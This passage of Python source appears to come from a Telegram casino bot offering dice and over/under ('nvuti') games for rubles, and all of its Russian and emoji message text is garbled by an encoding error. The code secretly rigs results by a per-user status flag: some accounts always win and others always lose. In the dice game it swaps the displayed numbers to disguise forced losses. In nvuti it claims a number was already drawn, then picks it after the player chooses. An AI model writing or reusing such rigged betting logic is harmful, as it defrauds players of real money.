				bot.send_message(message.chat.id, f'üíî –í–∞—à–∞ —Å—Ç–∞–≤–∫–∞ *–ø—Ä–æ–∏–≥—Ä–∞–ª–∞* - –ø—Ä–æ–∏–≥—Ä—ã—à *{bet}* ‚ÇΩ!\n–ß–∏—Å–ª–æ –±–æ—Ç–∞ - *{int(bot_value)}*, –í–∞—à–µ —á–∏—Å–ª–æ: *{int(user_value)}*',
					parse_mode='Markdown')

				balance 	= repl_percent(database.user_balance(chat_id))
				message = bot.send_message(chat_id, f'üíÅüèª‚Äç‚ôÄÔ∏è –í–≤–µ–¥–∏—Ç–µ *—Å—É–º–º—É* —Å—Ç–∞–≤–∫–∏\n–î–æ—Å—Ç—É–ø–Ω–æ: {balance} ‚ÇΩ', parse_mode="Markdown", reply_markup=keyboard.clear_keyboard())
				bot.register_next_step_handler(message, dice)
			elif (int(user_value) == int(bot_value)):

				bot.send_message(message.chat.id, f'ü§ù –ò–≥—Ä–∞ –∑–∞–∫–æ–Ω—á–∏–ª–∞—Å—å *–Ω–∏—á—å–µ–π*!\n–ß–∏—Å–ª–æ –±–æ—Ç–∞ - *{int(bot_value)}*, –í–∞—à–µ —á–∏—Å–ª–æ: *{int(user_value)}*',
					parse_mode='Markdown')

				balance 	= repl_percent(database.user_balance(chat_id))
				message = bot.send_message(chat_id, f'üíÅüèª‚Äç‚ôÄÔ∏è –í–≤–µ–¥–∏—Ç–µ *—Å—É–º–º—É* —Å—Ç–∞–≤–∫–∏\n–î–æ—Å—Ç—É–ø–Ω–æ: {balance} ‚ÇΩ', parse_mode="Markdown", reply_markup=keyboard.clear_keyboard())
				bot.register_next_step_handler(message, dice)
		elif (status == 1):

			if (int(user_value) > int(bot_value)):
				bet = repl_percent(bet)
				database.user_update_balance(message.chat.id, bet)
				database.user_update_win(message.chat.id)

				bot.send_message(message.chat.id, f'‚ù§Ô∏è –í–∞—à–∞ —Å—Ç–∞–≤–∫–∞ *–≤—ã–∏–≥—Ä–∞–ª–∞* - –≤—ã–∏–≥—Ä—ã—à *{bet}* ‚ÇΩ!\n–ß–∏—Å–ª–æ –±–æ—Ç–∞ - *{int(bot_value)}*, –í–∞—à–µ —á–∏—Å–ª–æ: *{int(user_value)}*',
					parse_mode='Markdown')

				balance 	= repl_percent(database.user_balance(chat_id))
				message = bot.send_message(chat_id, f'üíÅüèª‚Äç‚ôÄÔ∏è –í–≤–µ–¥–∏—Ç–µ *—Å—É–º–º—É* —Å—Ç–∞–≤–∫–∏\n–î–æ—Å—Ç—É–ø–Ω–æ: {balance} ‚ÇΩ', parse_mode="Markdown", reply_markup=keyboard.clear_keyboard())
				bot.register_next_step_handler(message, dice)
			elif (int(user_value) < int(bot_value)):
				bet = repl_percent(bet)
				database.user_update_balance(message.chat.id, bet)
				database.user_update_win(message.chat.id)

				bot.send_message(message.chat.id, f'‚ù§Ô∏è –í–∞—à–∞ —Å—Ç–∞–≤–∫–∞ *–≤—ã–∏–≥—Ä–∞–ª–∞* - –≤—ã–∏–≥—Ä—ã—à *{bet}* ‚ÇΩ!\n–ß–∏—Å–ª–æ –±–æ—Ç–∞ - *{int(user_value)}*, –í–∞—à–µ —á–∏—Å–ª–æ: *{int(bot_value)}*',
					parse_mode='Markdown')

				balance 	= repl_percent(database.user_balance(chat_id))
				message = bot.send_message(chat_id, f'üíÅüèª‚Äç‚ôÄÔ∏è –í–≤–µ–¥–∏—Ç–µ *—Å—É–º–º—É* —Å—Ç–∞–≤–∫–∏\n–î–æ—Å—Ç—É–ø–Ω–æ: {balance} ‚ÇΩ', parse_mode="Markdown", reply_markup=keyboard.clear_keyboard())
				bot.register_next_step_handler(message, dice)

			elif (int(user_value) == int(bot_value)):

				bot.send_message(message.chat.id, f'ü§ù –ò–≥—Ä–∞ –∑–∞–∫–æ–Ω—á–∏–ª–∞—Å—å *–Ω–∏—á—å–µ–π*!\n–ß–∏—Å–ª–æ –±–æ—Ç–∞ - *{int(bot_value)}*, –í–∞—à–µ —á–∏—Å–ª–æ: *{int(user_value)}*',
					parse_mode='Markdown')

				balance 	= repl_percent(database.user_balance(chat_id))
				message = bot.send_message(chat_id, f'üíÅüèª‚Äç‚ôÄÔ∏è –í–≤–µ–¥–∏—Ç–µ *—Å—É–º–º—É* —Å—Ç–∞–≤–∫–∏\n–î–æ—Å—Ç—É–ø–Ω–æ: {balance} ‚ÇΩ', parse_mode="Markdown", reply_markup=keyboard.clear_keyboard())
				bot.register_next_step_handler(message, dice)
		elif (status == 3):

			if (int(user_value) > int(bot_value)):
				bet = repl_percent(bet)
				database.user_update_balance(message.chat.id, -bet)
				database.user_update_lose(message.chat.id)

				bot.send_message(message.chat.id, f'üíî –í–∞—à–∞ —Å—Ç–∞–≤–∫–∞ *–ø—Ä–æ–∏–≥—Ä–∞–ª–∞* - –ø—Ä–æ–∏–≥—Ä—ã—à *{bet}* ‚ÇΩ!\n–ß–∏—Å–ª–æ –±–æ—Ç–∞ - *{int(user_value)}*, –í–∞—à–µ —á–∏—Å–ª–æ: *{int(bot_value)}*',
					parse_mode='Markdown')

				balance 	= repl_percent(database.user_balance(chat_id))
				message = bot.send_message(chat_id, f'üíÅüèª‚Äç‚ôÄÔ∏è –í–≤–µ–¥–∏—Ç–µ *—Å—É–º–º—É* —Å—Ç–∞–≤–∫–∏\n–î–æ—Å—Ç—É–ø–Ω–æ: {balance} ‚ÇΩ', parse_mode="Markdown", reply_markup=keyboard.clear_keyboard())
				bot.register_next_step_handler(message, dice)
			elif (int(user_value) < int(bot_value)):
				bet = repl_percent(bet)
				database.user_update_balance(message.chat.id, -bet)
				database.user_update_lose(message.chat.id)

				bot.send_message(message.chat.id, f'üíî –í–∞—à–∞ —Å—Ç–∞–≤–∫–∞ *–ø—Ä–æ–∏–≥—Ä–∞–ª–∞* - –ø—Ä–æ–∏–≥—Ä—ã—à *{bet}* ‚ÇΩ!\n–ß–∏—Å–ª–æ –±–æ—Ç–∞ - *{int(bot_value)}*, –í–∞—à–µ —á–∏—Å–ª–æ: *{int(user_value)}*',
					parse_mode='Markdown')

				balance 	= repl_percent(database.user_balance(chat_id))
				message = bot.send_message(chat_id, f'üíÅüèª‚Äç‚ôÄÔ∏è –í–≤–µ–¥–∏—Ç–µ *—Å—É–º–º—É* —Å—Ç–∞–≤–∫–∏\n–î–æ—Å—Ç—É–ø–Ω–æ: {balance} ‚ÇΩ', parse_mode="Markdown", reply_markup=keyboard.clear_keyboard())
				bot.register_next_step_handler(message, dice)
			elif (int(user_value) == int(bot_value)):

				bot.send_message(message.chat.id, f'ü§ù –ò–≥—Ä–∞ –∑–∞–∫–æ–Ω—á–∏–ª–∞—Å—å *–Ω–∏—á—å–µ–π*!\n–ß–∏—Å–ª–æ –±–æ—Ç–∞ - *{int(bot_value)}*, –í–∞—à–µ —á–∏—Å–ª–æ: *{int(user_value)}*',
					parse_mode='Markdown')

				balance 	= repl_percent(database.user_balance(chat_id))
				message = bot.send_message(chat_id, f'üíÅüèª‚Äç‚ôÄÔ∏è –í–≤–µ–¥–∏—Ç–µ *—Å—É–º–º—É* —Å—Ç–∞–≤–∫–∏\n–î–æ—Å—Ç—É–ø–Ω–æ: {balance} ‚ÇΩ', parse_mode="Markdown", reply_markup=keyboard.clear_keyboard())
				bot.register_next_step_handler(message, dice)
	except:
		pass

def dice(message):
	try:

		if (isfloat(message.text) is not False):
			balance = repl_percent((database.user_balance(message.chat.id)))
			bet = float(message.text)

			if (bet <= balance) and (bet > 10):

				message = bot.send_message(message.chat.id, f'üíÅüèª‚Äç‚ôÄÔ∏è –°—Ç–∞–≤–∫–∞ *–∑–∞—Å—á–∏—Ç–∞–Ω–∞*', parse_mode="Markdown")

				Thread = threading.Thread(target = dice_choice, args = (message, bet))
				Thread.start()
			else:
				message = bot.send_message(message.chat.id, f'‚ö†Ô∏è *–ù–µ –¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤* –∏–ª–∏ —Å—Ç–∞–≤–∫–∞ *–º–µ–Ω—å—à–µ* 10 ‚ÇΩ\n–í–≤–µ–¥–∏—Ç–µ *—Å—É–º–º—É* —Å—Ç–∞–≤–∫–∏, –¥–æ—Å—Ç—É–ø–Ω–æ: *{balance}* ‚ÇΩ', parse_mode="Markdown")
				bot.register_next_step_handler(message, dice)
		else:
			bot.send_message(message.chat.id, f'üíÅüèª‚Äç‚ôÄÔ∏è –í—ã –≤–µ—Ä–Ω—É–ª–∏—Å—å –≤ *—Å–ø–∏—Å–æ–∫* –∏–≥—Ä', parse_mode="Markdown", reply_markup=keyboard.game_keyboard())

	except:
		bot.send_message(message.chat.id, '‚ö†Ô∏è –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ *—á–∏—Å–ª–æ*', parse_mode="Markdown")

def nvuti_choice(message, bet):
	try:
		chat_id = message.chat.id
		status = database.user_status(message.chat.id)

		if (status == 2) or (status == 4):
			nums = random.randint(0, 100)
			if (message.text == '> 50'):
				if nums > 50:

					bet = repl_percent(bet)
					database.user_update_balance(message.chat.id, bet)
					database.user_update_win(message.chat.id)

					bot.send_message(message.chat.id, f'‚ù§Ô∏è –í–∞—à–∞ —Å—Ç–∞–≤–∫–∞ *–≤—ã–∏–≥—Ä–∞–ª–∞* - –≤—ã–∏–≥—Ä—ã—à *{bet}* ‚ÇΩ!\n–í—ã–ø–∞–≤—à–µ–µ —á–∏—Å–ª–æ - *{nums}*, –í–∞—à –≤—ã–±–æ—Ä: *{message.text}*',
						parse_mode='Markdown')

					balance 	= repl_percent(database.user_balance(chat_id))
					message = bot.send_message(chat_id, f'üíÅüèª‚Äç‚ôÄÔ∏è –í–≤–µ–¥–∏—Ç–µ *—Å—É–º–º—É* —Å—Ç–∞–≤–∫–∏\n–î–æ—Å—Ç—É–ø–Ω–æ: {balance} ‚ÇΩ', parse_mode="Markdown", reply_markup=keyboard.clear_keyboard())
					bot.register_next_step_handler(message, nvuti)
				else:
					database.user_update_balance(message.chat.id, -bet)
					database.user_update_lose(message.chat.id)

					bot.send_message(message.chat.id, f'üíî –í–∞—à–∞ —Å—Ç–∞–≤–∫–∞ *–ø—Ä–æ–∏–≥—Ä–∞–ª–∞* - –ø—Ä–æ–∏–≥—Ä—ã—à *{bet}* ‚ÇΩ!\n–í—ã–ø–∞–≤—à–µ–µ —á–∏—Å–ª–æ - *{nums}*, –í–∞—à –≤—ã–±–æ—Ä: *{message.text}*',
						parse_mode='Markdown')

					balance 	= repl_percent(database.user_balance(chat_id))
					message = bot.send_message(chat_id, f'üíÅüèª‚Äç‚ôÄÔ∏è –í–≤–µ–¥–∏—Ç–µ *—Å—É–º–º—É* —Å—Ç–∞–≤–∫–∏\n–î–æ—Å—Ç—É–ø–Ω–æ: {balance} ‚ÇΩ', parse_mode="Markdown", reply_markup=keyboard.clear_keyboard())
					bot.register_next_step_handler(message, nvuti)


			elif (message.text == '= 50'):
				if nums == 50:

					win = repl_percent(bet * 2)
					win = repl_percent(win)

					database.user_update_balance(message.chat.id, win)
					database.user_update_win(message.chat.id)

					bot.send_message(message.chat.id, f'‚ù§Ô∏è –í–∞—à–∞ —Å—Ç–∞–≤–∫–∞ *–≤—ã–∏–≥—Ä–∞–ª–∞* - –≤—ã–∏–≥—Ä—ã—à *{bet}* ‚ÇΩ!\n–í—ã–ø–∞–≤—à–µ–µ —á–∏—Å–ª–æ - *{nums}*, –í–∞—à –≤—ã–±–æ—Ä: *{message.text}*',
						parse_mode='Markdown')

					balance 	= repl_percent(database.user_balance(chat_id))
					message = bot.send_message(chat_id, f'üíÅüèª‚Äç‚ôÄÔ∏è –í–≤–µ–¥–∏—Ç–µ *—Å—É–º–º—É* —Å—Ç–∞–≤–∫–∏\n–î–æ—Å—Ç—É–ø–Ω–æ: {balance} ‚ÇΩ', parse_mode="Markdown", reply_markup=keyboard.clear_keyboard())
					bot.register_next_step_handler(message, nvuti)
				else:
					database.user_update_balance(message.chat.id, -bet)
					database.user_update_lose(message.chat.id)

					bot.send_message(message.chat.id, f'üíî –í–∞—à–∞ —Å—Ç–∞–≤–∫–∞ *–ø—Ä–æ–∏–≥—Ä–∞–ª–∞* - –ø—Ä–æ–∏–≥—Ä—ã—à *{bet}* ‚ÇΩ!\n–í—ã–ø–∞–≤—à–µ–µ —á–∏—Å–ª–æ - *{nums}*, –í–∞—à –≤—ã–±–æ—Ä: *{message.text}*',
						parse_mode='Markdown')

					balance 	= repl_percent(database.user_balance(chat_id))
					message = bot.send_message(chat_id, f'üíÅüèª‚Äç‚ôÄÔ∏è –í–≤–µ–¥–∏—Ç–µ *—Å—É–º–º—É* —Å—Ç–∞–≤–∫–∏\n–î–æ—Å—Ç—É–ø–Ω–æ: {balance} ‚ÇΩ', parse_mode="Markdown", reply_markup=keyboard.clear_keyboard())
					bot.register_next_step_handler(message, nvuti)
			elif (message.text == '< 50'):
				if nums < 50:

					bet = repl_percent(bet)

					database.user_update_balance(message.chat.id, bet)
					database.user_update_win(message.chat.id)

					bot.send_message(message.chat.id, f'‚ù§Ô∏è –í–∞—à–∞ —Å—Ç–∞–≤–∫–∞ *–≤—ã–∏–≥—Ä–∞–ª–∞* - –≤—ã–∏–≥—Ä—ã—à *{bet}* ‚ÇΩ!\n–í—ã–ø–∞–≤—à–µ–µ —á–∏—Å–ª–æ - *{nums}*, –í–∞—à –≤—ã–±–æ—Ä: *{message.text}*',
						parse_mode='Markdown')
				else:
					bet = repl_percent(bet)
					database.user_update_balance(message.chat.id, -bet)
					database.user_update_lose(message.chat.id)

					bot.send_message(message.chat.id, f'üíî –í–∞—à–∞ —Å—Ç–∞–≤–∫–∞ *–ø—Ä–æ–∏–≥—Ä–∞–ª–∞* - –ø—Ä–æ–∏–≥—Ä—ã—à *{bet}* ‚ÇΩ!\n–í—ã–ø–∞–≤—à–µ–µ —á–∏—Å–ª–æ - *{nums}*, –í–∞—à –≤—ã–±–æ—Ä: *{message.text}*',
						parse_mode='Markdown')

					balance 	= repl_percent(database.user_balance(chat_id))
					message = bot.send_message(chat_id, f'üíÅüèª‚Äç‚ôÄÔ∏è –í–≤–µ–¥–∏—Ç–µ *—Å—É–º–º—É* —Å—Ç–∞–≤–∫–∏\n–î–æ—Å—Ç—É–ø–Ω–æ: {balance} ‚ÇΩ', parse_mode="Markdown", reply_markup=keyboard.clear_keyboard())
					bot.register_next_step_handler(message, nvuti)
		elif (status == 1):
			if (message.text == "> 50"):
				nums = random.randint(51, 100)
				
				bet = repl_percent(bet)

				database.user_update_balance(message.chat.id, bet)
				database.user_update_win(message.chat.id)

				bot.send_message(message.chat.id, f'‚ù§Ô∏è –í–∞—à–∞ —Å—Ç–∞–≤–∫–∞ *–≤—ã–∏–≥—Ä–∞–ª–∞* - –≤—ã–∏–≥—Ä—ã—à *{bet}* ‚ÇΩ!\n–í—ã–ø–∞–≤—à–µ–µ —á–∏—Å–ª–æ - *{nums}*, –í–∞—à –≤—ã–±–æ—Ä: *{message.text}*',
					parse_mode='Markdown')

				balance 	= repl_percent(database.user_balance(chat_id))
				message = bot.send_message(chat_id, f'üíÅüèª‚Äç‚ôÄÔ∏è –í–≤–µ–¥–∏—Ç–µ *—Å—É–º–º—É* —Å—Ç–∞–≤–∫–∏\n–î–æ—Å—Ç—É–ø–Ω–æ: {balance} ‚ÇΩ', parse_mode="Markdown", reply_markup=keyboard.clear_keyboard())
				bot.register_next_step_handler(message, nvuti)

			elif (message.text == "= 50"):

				win = repl_percent(bet * 2)
				win = repl_percent(win)
				database.user_update_balance(message.chat.id, win)
				database.user_update_win(message.chat.id)

				bot.send_message(message.chat.id, f'‚ù§Ô∏è –í–∞—à–∞ —Å—Ç–∞–≤–∫–∞ *–≤—ã–∏–≥—Ä–∞–ª–∞* - –≤—ã–∏–≥—Ä—ã—à *{bet}* ‚ÇΩ!\n–í—ã–ø–∞–≤—à–µ–µ —á–∏—Å–ª–æ - *50*, –í–∞—à –≤—ã–±–æ—Ä: *{message.text}*',
					parse_mode='Markdown')

				balance 	= repl_percent(database.user_balance(chat_id))
				message = bot.send_message(chat_id, f'üíÅüèª‚Äç‚ôÄÔ∏è –í–≤–µ–¥–∏—Ç–µ *—Å—É–º–º—É* —Å—Ç–∞–≤–∫–∏\n–î–æ—Å—Ç—É–ø–Ω–æ: {balance} ‚ÇΩ', parse_mode="Markdown", reply_markup=keyboard.clear_keyboard())
				bot.register_next_step_handler(message, nvuti)

			elif (message.text == "< 50"):
				nums = random.randint(0, 49)

				bet = repl_percent(bet)
				
				database.user_update_balance(message.chat.id, bet)
				database.user_update_win(message.chat.id)

				bot.send_message(message.chat.id, f'‚ù§Ô∏è –í–∞—à–∞ —Å—Ç–∞–≤–∫–∞ *–≤—ã–∏–≥—Ä–∞–ª–∞* - –≤—ã–∏–≥—Ä—ã—à *{bet}* ‚ÇΩ!\n–í—ã–ø–∞–≤—à–µ–µ —á–∏—Å–ª–æ - *{nums}*, –í–∞—à –≤—ã–±–æ—Ä: *{message.text}*',
					parse_mode='Markdown')

				balance 	= repl_percent(database.user_balance(chat_id))
				message = bot.send_message(chat_id, f'üíÅüèª‚Äç‚ôÄÔ∏è –í–≤–µ–¥–∏—Ç–µ *—Å—É–º–º—É* —Å—Ç–∞–≤–∫–∏\n–î–æ—Å—Ç—É–ø–Ω–æ: {balance} ‚ÇΩ', parse_mode="Markdown", reply_markup=keyboard.clear_keyboard())
				bot.register_next_step_handler(message, nvuti)
		elif (status == 3):
			if (message.text == '> 50'):

				nums = random.randint(0, 49)
				bet = repl_percent(bet)

				database.user_update_balance(message.chat.id, -bet)
				database.user_update_lose(message.chat.id)

				bot.send_message(message.chat.id, f'üíî –í–∞—à–∞ —Å—Ç–∞–≤–∫–∞ *–ø—Ä–æ–∏–≥—Ä–∞–ª–∞* - –ø—Ä–æ–∏–≥—Ä—ã—à *{bet}* ‚ÇΩ!\n–í—ã–ø–∞–≤—à–µ–µ —á–∏—Å–ª–æ - *{nums}*, –í–∞—à –≤—ã–±–æ—Ä: *{message.text}*',
					parse_mode='Markdown')

				balance 	= repl_percent(database.user_balance(chat_id))
				message = bot.send_message(chat_id, f'üíÅüèª‚Äç‚ôÄÔ∏è –í–≤–µ–¥–∏—Ç–µ *—Å—É–º–º—É* —Å—Ç–∞–≤–∫–∏\n–î–æ—Å—Ç—É–ø–Ω–æ: {balance} ‚ÇΩ', parse_mode="Markdown", reply_markup=keyboard.clear_keyboard())
				bot.register_next_step_handler(message, nvuti)
			elif (message.text == '= 50'):
				nums = random.randint(0, 49)
				bet = repl_percent(bet)

				database.user_update_balance(message.chat.id, -bet)
				database.user_update_lose(message.chat.id)

				bot.send_message(message.chat.id, f'üíî –í–∞—à–∞ —Å—Ç–∞–≤–∫–∞ *–ø—Ä–æ–∏–≥—Ä–∞–ª–∞* - –ø—Ä–æ–∏–≥—Ä—ã—à *{bet}* ‚ÇΩ!\n–í—ã–ø–∞–≤—à–µ–µ —á–∏—Å–ª–æ - *{nums}*, –í–∞—à –≤—ã–±–æ—Ä: *{message.text}*',
					parse_mode='Markdown')

				balance 	= repl_percent(database.user_balance(chat_id))
				message = bot.send_message(chat_id, f'üíÅüèª‚Äç‚ôÄÔ∏è –í–≤–µ–¥–∏—Ç–µ *—Å—É–º–º—É* —Å—Ç–∞–≤–∫–∏\n–î–æ—Å—Ç—É–ø–Ω–æ: {balance} ‚ÇΩ', parse_mode="Markdown", reply_markup=keyboard.clear_keyboard())
				bot.register_next_step_handler(message, nvuti)
			elif (message.text == '< 50'):
				nums = random.randint(51, 100)
				bet = repl_percent(bet)

				database.user_update_balance(message.chat.id, -bet)
				database.user_update_lose(message.chat.id)

				bot.send_message(message.chat.id, f'üíî –í–∞—à–∞ —Å—Ç–∞–≤–∫–∞ *–ø—Ä–æ–∏–≥—Ä–∞–ª–∞* - –ø—Ä–æ–∏–≥—Ä—ã—à *{bet}* ‚ÇΩ!\n–í—ã–ø–∞–≤—à–µ–µ —á–∏—Å–ª–æ - *{nums}*, –í–∞—à –≤—ã–±–æ—Ä: *{message.text}*',
					parse_mode='Markdown')
				balance 	= repl_percent(database.user_balance(chat_id))
				message = bot.send_message(chat_id, f'üíÅüèª‚Äç‚ôÄÔ∏è –í–≤–µ–¥–∏—Ç–µ *—Å—É–º–º—É* —Å—Ç–∞–≤–∫–∏\n–î–æ—Å—Ç—É–ø–Ω–æ: {balance} ‚ÇΩ', parse_mode="Markdown", reply_markup=keyboard.clear_keyboard())
				bot.register_next_step_handler(message, nvuti)

	except:
		pass

def nvuti(message):
	try:

		if (isfloat(message.text) is not False):
			balance = repl_percent((database.user_balance(message.chat.id)))
			bet = float(message.text)

			if (bet <= balance) and (bet > 10):

				message = bot.send_message(message.chat.id, f'üíÅüèª‚Äç‚ôÄÔ∏è –°—Ç–∞–≤–∫–∞ *–∑–∞—Å—á–∏—Ç–∞–Ω–∞*, –≤—ã–ø–∞–ª–æ —á–∏—Å–ª–æ, –≤—ã–±–µ—Ä–∏—Ç–µ –µ–≥–æ –∏–Ω—Ç–µ—Ä–≤–∞–ª', parse_mode="Markdown", reply_markup=keyboard.nvuti_keyboard())
				bot.register_next_step_handler(message, nvuti_choice, bet)

			else:
				message = bot.send_message(message.chat.id, f'‚ö†Ô∏è *–ù–µ –¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤* –∏–ª–∏ —Å—Ç–∞–≤–∫–∞ *–º–µ–Ω—å—à–µ* 10 ‚ÇΩ\n–í–≤–µ–¥–∏—Ç–µ *—Å—É–º–º—É* —Å—Ç–∞–≤–∫–∏, –¥–æ—Å—Ç—É–ø–Ω–æ: *{balance}* ‚ÇΩ', parse_mode="Markdown")
				bot.register_next_step_handler(message, nvuti)
		else:
			bot.send_message(message.chat.id, f'üíÅüèª‚Äç‚ôÄÔ∏è –í—ã –≤–µ—Ä–Ω—É–ª–∏—Å—å –≤ *—Å–ø–∏—Å–æ–∫* –∏–≥—Ä', parse_mode="Markdown", reply_markup=keyboard.game_keyboard())

	except:
		bot.send_message(message.chat.id, '‚ö†Ô∏è –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ *—á–∏—Å–ª–æ*', parse_mode="Markdown")